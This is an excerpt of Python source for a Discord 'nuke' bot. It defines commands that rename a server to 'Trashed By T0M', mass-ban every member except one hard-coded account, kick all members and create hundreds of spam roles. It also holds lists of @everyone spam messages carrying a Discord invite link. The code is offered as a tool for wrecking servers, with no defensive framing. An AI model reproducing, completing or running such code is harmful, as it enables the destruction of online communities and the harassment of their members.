...
channel_names = [
    'Trashed By T0M', 'Trashed By T0M', 'Trashed By T0M', 'Trashed By T0M',
    'Trashed By T0M'
]
message_spam = [
    '@everyone https://discord.gg/NDmYQs8YRb',
    '@everyone  https://discord.gg/NDmYQs8YRb',
    '@everyone https://discord.gg/NDmYQs8YRb',
    '@everyone https://discord.gg/NDmYQs8YRb'
]
webhook_names = ['Trashed By T0M', 'Trashed By T0M', 'Trashed By T0M']


###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name="Trashing")
...
async def nuke(ctx, amount=50):
  ...
  await ctx.guild.edit(name="Trashed By T0M")
  ...
  for i in range(100):
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:
        try:
          await member.ban(reason="Trashed By T0M")
          print(
...
async def kickall(ctx):
  ...
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Trashed By T0M")
      print(
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Trashed By T0M")
